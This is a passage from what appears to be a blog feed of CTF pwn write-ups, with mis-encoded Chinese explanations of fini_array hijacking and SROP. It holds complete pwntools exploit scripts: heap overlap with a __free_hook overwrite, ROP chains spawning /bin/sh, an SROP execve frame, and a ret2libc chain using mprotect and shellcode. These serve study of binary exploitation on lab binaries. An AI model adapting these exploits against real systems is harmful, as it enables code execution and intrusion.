class="line">p=process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/tr0upe/tools/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmd=&#x27;b *0x400A39\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400B2B\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400CFB\n&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p,cmd)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>,size)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,new_content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap : &#x27;</span>,new_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index1</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,index1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_start_main_got=<span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">creat(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">24</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">dele(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">creat(<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">40</span>+p64(libc_start_main_got))</span><br><span class="line"></span><br><span class="line">show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">libcbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x20740</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase =&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">exe=libcbase+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook =&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;exe =&gt; &#x27;</span>+<span class="built_in">hex</span>(exe))</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">creat(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmd=&#x27;b *0x400A39\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400B2B\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400CFB\n&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p,cmd)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">24</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">dele(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">creat(<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x30</span>)+p64(free_hook))</span><br><span class="line">edit(<span class="string">b&#x27;3&#x27;</span>,p64(exe))</span><br><span class="line">dele(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ«æŒfini_array</title>
      <link href="/posts/1887/"/>
      <url>/posts/1887/</url>
      
        <content type="html"><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><p>ç¨‹åºçš„å…¥å£å¹¶ä¸æ˜¯main,è€Œæ˜¯libc_start_main,ç¨‹åºè¿è¡Œæµç¨‹å›¾å¦‚ä¸‹ï¼š</p><ul><li>__libc_csu_init</li><li>main</li><li>__libc_csu_fini</li><li>fini_array[1]</li><li>fini_array[0]</li></ul><p>libc_start_mainå‡½æ•°åŸå‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main(main,argc,argv&amp;env,_libc_csu_init,_libc_csu_fini,rtld_fini)</span><br></pre></td></tr></table></figure><p><code>_libc_csu_init</code>,<code>_libc_csu_fini</code>åœ¨ä»£ç æ®µ,å¯è§æ˜¯å‡½æ•°</p><p>ä¸‹é¢æ˜¯_libc_csu_finiå‡½æ•°çš„æ±‡ç¼–å®ç°,æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">push    rbp #å°†rbpçš„å€¼å‹å…¥æ ˆ</span><br><span class="line">lea     rax, unk_4B80C0 #å°†unk_4B80C0çš„åœ°å€(0x4B80C0)æ”¾å…¥raxå¯„å­˜å™¨</span><br><span class="line">lea     rbp, off_4B80B0 #å°†off_4B80B0çš„åœ°å€(0x4B80B0)æ”¾å…¥rbpå¯„å­˜å™¨</span><br><span class="line"></span><br><span class="line">push    rbx</span><br><span class="line">sub     rax, rbp #rax=rax-rbp=0x10</span><br><span class="line">sub     rsp, 8 </span><br><span class="line">sar     rax, 3 #raxä¸­çš„å€¼ç®—æ•°å³ç§»3ä½,raxçš„å€¼ä¸º2</span><br><span class="line">jz      short loc_402CE6 #JZ,ZFæ ‡å¿—ä½=1è·³è½¬</span><br><span class="line"></span><br><span class="line">lea     rbx, [rax-1] #å°†rax-1çš„å€¼å³1èµ‹ç»™rbx</span><br><span class="line">nop     dword ptr [rax+00000000h] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loc_402CD8:                             </span><br><span class="line">call    qword ptr [rbp+rbx*8+0] #call [rbp+8]</span><br><span class="line"></span><br><span class="line">sub     rbx, 1 #rbx=0</span><br><span class="line">cmp     rbx, 0FFFFFFFFFFFFFFFFh </span><br><span class="line">jnz     short loc_402CD8 #zfä¸ä¸º0,è·³è½¬loc_402CD8ç»§ç»­æ‰§è¡Œcall [rbp]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loc_402CE6:                          </span><br><span class="line">add     rsp, 8</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">jmp     _term_proc</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°,è°ƒç”¨finiå‡½æ•°æ—¶,ä¼šå…ˆ<code>call fini_array[1]</code>,å†<code>call fini_array[0]</code>,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹fini_arrayä¸­çš„å€¼æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œ,ä¾‹å¦‚å°†<code>fini_array[1]</code>ä¸­çš„å€¼ä¿®æ”¹ä¸º<code>main</code>,<code> fini_array[0]</code>ä¸­çš„å€¼ä¿®æ”¹ä¸º<code>_libc_csu_fini</code>,è¿™æ ·çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202309101651108.png" alt="fini_array"></p><h2 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h2><p><strong>Memory_Monster_II</strong></p><p>IDAé€†å‘,é™æ€ç¼–è¯‘å»ç¬¦å·è¡¨</p><p>æ‰¾åˆ°startå‡½æ•°åç¼–è¯‘,startå‡½æ•°é‡Œæœ‰libc_start_mainå‡½æ•°,å…¶å‚æ•°å«æœ‰<code>main</code>,<code>_libc_csu_init</code>,<code>_libc_csu_fini</code></p><p>æœ‰canary,æ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥æº¢å‡º</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202309101703301.png" alt="fini_array1"></p><p>å¦‚å›¾,ç®­å¤´æ‰€æŒ‡æœ‰ä»»æ„åœ°å€å†™,æˆ‘ä»¬å¯ä»¥æ ¹æ®ä¸Šè¿°æ–¹æ³•ä¿®æ”¹fini_arrayä½¿å…¶æ— é™å†™,åœ¨æŸä¸€åœ°å€å¸ƒç½®å¥½ropé“¾å,å°†fini_array[1]æ”¹ä¸º<code>ret</code>,fini_array[0]æ”¹ä¸º<code>leave ret</code>,å³å¯é€€å‡ºå¾ªç¯æ‰§è¡Œropé“¾</p><p>è¿™é‡Œå°±æœ‰ä¸€ä¸ªé—®é¢˜,<code>leave ret</code>åå¦‚ä½•æ¥ä¸Šropé“¾,è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°fini_array[0]å¤„çš„æŒ‡ä»¤ç›¸å½“äº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp </span><br><span class="line">pop rbp</span><br><span class="line">pop rip</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªéœ€è®©ropé“¾çš„å¼€å§‹å¡«åˆ°<code>pop rip</code>çš„ä½ç½®,fini_array[0]çš„åœ°å€æ˜¯<code>0x4B80B0</code>,æ‰€ä»¥å†™å…¥çš„ä½ç½®åº”ä¸º<code>0x4B80C0</code><br>wp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./Memory_Monster_II&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">fini_array=<span class="number">0x4B80B0</span></span><br><span class="line">main=<span class="number">0x401C1D</span></span><br><span class="line">libc_csu_fini=<span class="number">0x402CB0</span></span><br><span class="line">fini_array_0x10=<span class="number">0x4B80C0</span></span><br><span class="line">pop_rax_ret=<span class="number">0x448fcc</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401746</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x406f80</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x448415</span></span><br><span class="line">syscall=<span class="number">0x402514</span></span><br><span class="line">leave_ret=<span class="number">0x401cf3</span></span><br><span class="line">binsh=<span class="number">0x4B8108</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1=p64(fini_array)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">payload2=p64(libc_csu_fini)+p64(main)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rax_ret)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x10</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rdi_ret)+p64(<span class="number">0x4B8108</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x20</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x30</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x40</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(syscall)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(leave_ret)+p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>srop</title>
      <link href="/posts/35734/"/>
      <url>/posts/35734/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†:"></a>åŸç†:</h2><p>SROPï¼ˆSigreturn Oriented Programmingï¼‰ï¼Œsigreturnæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨Â unixÂ ç³»ç»Ÿå‘ç”ŸÂ signalÂ çš„æ—¶å€™ä¼šè¢«é—´æ¥è°ƒç”¨<br>å½“ç³»ç»Ÿè¿›ç¨‹å‘èµ·ï¼ˆdeliverï¼‰ä¸€ä¸ª signal çš„æ—¶å€™ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«çŸ­æš‚çš„æŒ‚èµ·ï¼ˆsuspendï¼‰ï¼Œè¿›å…¥å†…æ ¸â‘ ï¼Œç„¶åå†…æ ¸å¯¹è¯¥è¿›ç¨‹ä¿ç•™ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œè·³è½¬åˆ°ä¹‹å‰æ³¨å†Œå¥½çš„ signal handlerÂ ä¸­å¤„ç†Â signalâ‘¡ï¼Œå½“ signal è¿”å›åâ‘¢ï¼Œå†…æ ¸ä¸ºè¿›ç¨‹æ¢å¤ä¹‹å‰ä¿ç•™çš„ä¸Šä¸‹æ–‡ï¼Œæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œâ‘£<br><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202308192253867.png"><br>å†…æ ¸ä¸ºè¿›ç¨‹ä¿ç•™ç›¸åº”çš„ä¸Šä¸‹æ–‡çš„æ–¹æ³•ä¸»è¦æ˜¯ï¼š<strong>å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ï¼Œæ­¤æ—¶æ ˆçš„æƒ…å†µæ˜¯è¿™æ ·çš„ï¼š<br><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202308192253891.png"><br>æˆ‘ä»¬<strong>ç§°Â ucontextÂ ä»¥åŠÂ siginfoÂ è¿™ä¸€æ®µä¸ºÂ signalÂ frame</strong>ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡Â signal handlerÂ ä¸­å¤„ç†ç›¸åº”çš„Â signalï¼Œå› æ­¤ï¼Œå½“ signal handlerÂ æ‰§è¡Œå®Œæˆåå°±ä¼š<strong>æ‰§è¡ŒÂ sigreturnÂ ç³»ç»Ÿè°ƒç”¨æ¥æ¢å¤ä¸Šä¸‹æ–‡ï¼Œä¸»è¦æ˜¯å°†ä¹‹å‰å‹å…¥çš„å¯„å­˜å™¨çš„å†…å®¹ç»™è¿˜åŸå›å¯¹åº”çš„å¯„å­˜å™¨</strong>ï¼Œç„¶åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œ</p><p>32 ä½çš„ sigreturnÂ çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 77ï¼Œ64Â ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15</p><h2 id="ä¾‹é¢˜æ€è·¯"><a href="#ä¾‹é¢˜æ€è·¯" class="headerlink" title="ä¾‹é¢˜æ€è·¯:"></a>ä¾‹é¢˜æ€è·¯:</h2><table><thead><tr><th>ç³»ç»Ÿè°ƒç”¨</th><th>è°ƒç”¨å·</th><th>å‡½æ•°åŸå‹</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>read(int fd, void *buf, size_t count)</td></tr><tr><td>write</td><td>1</td><td>write(int fd, const void *buf, size_t count)</td></tr><tr><td>sigreturn</td><td>15</td><td>int sigreturn(â€¦)</td></tr><tr><td>execve</td><td>59</td><td>execve(const char *filename, char *const argv[],char *const envp[])</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">start_addr=<span class="number">0x4004F1</span></span><br><span class="line">syscall_ret=<span class="number">0x400517</span></span><br><span class="line">rax_ret=<span class="number">0x4004DA</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400501&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(start_addr) <span class="comment">#åœ¨æ ˆä¸Šå†™/bin/sh,è¿”å›readå‡½æ•°</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])-<span class="number">0x148</span> <span class="comment">#gdbè°ƒè¯•,æ³„éœ²æ ˆåœ°å€,-0x148æ˜¯/bin/shçš„åœ°å€</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = constants.SYS_execve</span><br><span class="line">execve.rdi = stack_addr <span class="comment">#/bin/shåœ°å€,ä¸‹åŒ</span></span><br><span class="line">execve.rsi = <span class="number">0x0</span> </span><br><span class="line">execve.rdx = <span class="number">0x0</span> </span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rax_ret)+p64(syscall_ret)+<span class="built_in">bytes</span>(execve) <span class="comment">#rax=15,è°ƒç”¨sigreturn,æ¢å¤å¯„å­˜å™¨çš„å€¼,å³è°ƒç”¨execve</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justcode</title>
      <link href="/posts/10973/"/>
      <url>/posts/10973/</url>
      
        <content type="html"><![CDATA[<p>åˆ©ç”¨æ–¹å¼ï¼šä¸€ä¸ªæœªåˆå§‹åŒ–çš„å˜é‡å’Œscanfç¼ºå°‘å–åœ°å€ç¬¦å·å¯¼è‡´çš„ä»»æ„åœ°å€å†™</p><p>æ³¨æ„ï¼šå¾ªç¯ä¸­æ ˆçš„åœ°å€æ˜¯å¤ç”¨çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/miko/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_chk_fail=<span class="number">0x602038</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400ea3</span></span><br><span class="line">put_plt=<span class="number">0x400940</span></span><br><span class="line">libc_start_main_got=<span class="number">0x602050</span></span><br><span class="line">main=<span class="number">0x400D4B</span></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x400901</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400C7F\nb *0x400D00&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your code:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+p32(stack_chk_fail)</span><br><span class="line"><span class="comment">#payload=payload.ljust(0x80,b&#x27;a&#x27;)</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x400ea3</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;info:\n&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=p64(pop_rdi_ret)+p64(libc_start_main_got)+p64(put_plt)+p64(ret)+p64(main)</span><br><span class="line">payload1=payload1.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">true=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libcbase=true-offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your code:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x400ea1</span></span><br><span class="line">pop_rdx_r10_ret=<span class="number">0x1151a4</span>+libcbase</span><br><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libcbase</span><br><span class="line">gets=libc.symbols[<span class="string">&#x27;gets&#x27;</span>]+libcbase</span><br><span class="line">addr=<span class="number">0x602000</span></span><br><span class="line">saveto=<span class="number">0x602300</span></span><br><span class="line"></span><br><span class="line">payload2=p64(pop_rdi_ret)+p64(saveto)+p64(gets)</span><br><span class="line">payload2+=p64(pop_rdi_ret)+p64(addr)+p64(pop_rsi_r15_ret)+p64(<span class="number">0x1000</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2+=p64(pop_rdx_r10_ret)+p64(<span class="number">0x7</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(saveto)</span><br><span class="line">payload2=payload2.ljust(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;name:\n&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">payload3=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">payload3+=shellcraft.read(<span class="number">0x3</span>,saveto,<span class="number">0x40</span>)</span><br><span class="line">payload3+=shellcraft.write(<span class="number">0x1</span>,saveto,<span class="number">0x40</span>)</span><br><span class="line">p.sendline(asm(payload3))</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
